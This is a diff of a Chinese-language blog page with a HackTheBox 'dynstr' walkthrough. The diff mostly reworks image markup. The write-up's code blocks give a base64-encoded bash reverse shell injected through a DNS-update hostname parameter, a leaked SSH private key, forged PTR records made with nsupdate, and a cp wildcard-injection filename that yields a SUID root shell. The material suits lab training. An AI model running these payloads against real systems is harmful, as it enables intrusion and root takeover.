@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;352  10.10.10.244   端口扫描22,53,80: 12345678910111213141516171819202122$ nmap -sC -sV 10.10.10.244Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-06-">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;352  10.10.10.244                                                                                                              端口扫描22,53,80: 123456">
 <meta property="og:type" content="article">
 <meta property="og:title" content="dynstr - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2021/06/16/dynstr-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;352  10.10.10.244   端口扫描22,53,80: 12345678910111213141516171819202122$ nmap -sC -sV 10.10.10.244Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-06-">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;www.hackthebox.eu&#x2F;home&#x2F;machines&#x2F;profile&#x2F;352  10.10.10.244                                                                                                              端口扫描22,53,80: 123456">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061601.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061602.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061603.jpg">
@@ -132,7 +132,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -222,14 +222,28 @@
 </li>
 <li><h2 id="10-10-10-244"><a href="#10-10-10-244" class="headerlink" title="10.10.10.244"></a>10.10.10.244</h2></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061601.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061601.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22,53,80:</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV 10.10.10.244</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-16 13:08 CST</span><br><span class="line">Nmap scan report for 10.10.10.244</span><br><span class="line">Host is up (0.072s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)</span><br><span class="line">|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)</span><br><span class="line">|_  256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)</span><br><span class="line">53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)</span><br><span class="line">| dns-nsid:</span><br><span class="line">|_  bind.version: 9.16.1-Ubuntu</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Dyna DNS</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 46.19 seconds</span><br></pre></td></tr></table></figure>
 
 
 
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>Dyna dns,得到几个域名和一组账号密码,得到的域名加hosts：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061602.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061602.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">dnsalias.htb</span><br><span class="line">dynamicdns.htb</span><br><span class="line">no-ip.htb</span><br><span class="line"></span><br><span class="line">London Office,</span><br><span class="line">London.</span><br><span class="line">F: +42 0010-1010</span><br><span class="line">E: dns@dyna.htb</span><br><span class="line"></span><br><span class="line">Username: dynadns</span><br><span class="line">Password: sndanyd</span><br><span class="line"></span><br><span class="line">10.10.10.244 dnsalias.htb dynamicdns.htb no-ip.htb dyna.htb</span><br></pre></td></tr></table></figure>
 
 <p>几个域名直接访问都没什么东西</p>
@@ -238,38 +252,122 @@
 <li>Perform Update (RA-API) | Dyn Help Center<br><a href="https://help.dyn.com/remote-access-api/perform-update/" target="_blank" rel="noopener">https://help.dyn.com/remote-access-api/perform-update/</a></li>
 <li>DNS-O-Matic | Api<br><a href="https://www.dnsomatic.com/docs/api" target="_blank" rel="noopener">https://www.dnsomatic.com/docs/api</a></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061603.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061603.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="update"><a href="#update" class="headerlink" title="update"></a>update</h2><p>根据文档可以update dns记录，用户名密码就是前面得到的：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061604.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061604.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>hostname参数命令注入,得到www-data：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;bash -i &amp;&gt;&#x2F;dev&#x2F;tcp&#x2F;10.10.14.9&#x2F;4444 0&gt;&amp;1&quot; | base64</span><br><span class="line">YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjkvNDQ0NCAwPiYxCg&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">&#x2F;nic&#x2F;update?hostname&#x3D;$(echo+&quot;YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjkvNDQ0NCAwPiYxCg&#x3D;&#x3D;&quot;+|+base64+-d+|+bash)test.dynamicdns.htb&amp;myip&#x3D;10.10.14.9&amp;offline&#x3D;YES</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061606.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061605.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061606.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061605.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h1><p>枚举，发现一些信息</p>
 <h2 id="strace-C62796521-txt"><a href="#strace-C62796521-txt" class="headerlink" title="strace-C62796521.txt"></a>strace-C62796521.txt</h2><p>bindmgr用户目录可以发现一个strace文件，里面可以提取出一个私钥，但不能直接使用：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061607.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061607.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="authorized-keys"><a href="#authorized-keys" class="headerlink" title="authorized_keys"></a>authorized_keys</h2><p>根据authorized_keys可以知道配置的是只能通过*.infra.dyna.htb使用ssh私钥连接：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061608.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061608.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="bindmgr-id-rsa"><a href="#bindmgr-id-rsa" class="headerlink" title="bindmgr_id_rsa"></a>bindmgr_id_rsa</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n" &gt; bindmgr_id_rsa</span><br></pre></td></tr></table></figure>
 
 <h1 id="PTR-dns-amp-user-flag"><a href="#PTR-dns-amp-user-flag" class="headerlink" title="PTR dns &amp; user flag"></a>PTR dns &amp; user flag</h1><p>根据update代码可以知道添加dns记录的命令和配置文件路径，其中有infra.key:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061609.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061609.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>可以添加一个PTR记录</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nsupdate -v -k &#x2F;etc&#x2F;bind&#x2F;infra.key</span><br><span class="line">update add miao.infra.dyna.htb. 86400 a 10.10.14.9</span><br><span class="line"># 这里要有个空行，按一次回车</span><br><span class="line">update add 9.14.10.10.in-addr.arpa. 86400 PTR miao.infra.dyna.htb.</span><br><span class="line">send</span><br><span class="line">show</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061610.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061610.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>PTR记录添加成功后，可以SSH登录，得到user.txt:</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061611.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061611.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><h2 id="bindmgr-sh"><a href="#bindmgr-sh" class="headerlink" title="bindmgr.sh"></a>bindmgr.sh</h2><p>Sudo -l发现bindmgr.sh，查看文件内容，发现里面检查.version文件，版本大于$BINDMGR_DIR/.version后调用cp,，使用通配符：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061612.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061612.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>因为使用通配符，可以使用–preserve=mode作为文件名，会被cp处理为参数选项，复制它会保留这个目录中文件的属性，例如suid,因为是sudo调用，复制后的文件所有者是root，所以就拥有了root的suid：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--preserve&#x3D;mode</span><br></pre></td></tr></table></figure>
 
 <h1 id="提权-amp-root-flag"><a href="#提权-amp-root-flag" class="headerlink" title="提权 &amp; root flag"></a>提权 &amp; root flag</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">echo 2 &gt; .version</span><br><span class="line">cp /bin/bash .</span><br><span class="line">chmod +s bash</span><br><span class="line">echo &gt; --preserve=mode</span><br><span class="line"></span><br><span class="line">sudo /usr/local/bin/bindmgr.sh</span><br><span class="line"></span><br><span class="line">/etc/bind/named.bindmgr/bash -p</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061613.jpg" alt=""></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061614.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061613.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021061614.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>Perform Update (RA-API) | Dyn Help Center<br><a href="https://help.dyn.com/remote-access-api/perform-update/" target="_blank" rel="noopener">https://help.dyn.com/remote-access-api/perform-update/</a></li>
 <li>DNS-O-Matic | Api<br><a href="https://www.dnsomatic.com/docs/api" target="_blank" rel="noopener">https://www.dnsomatic.com/docs/api</a></li>
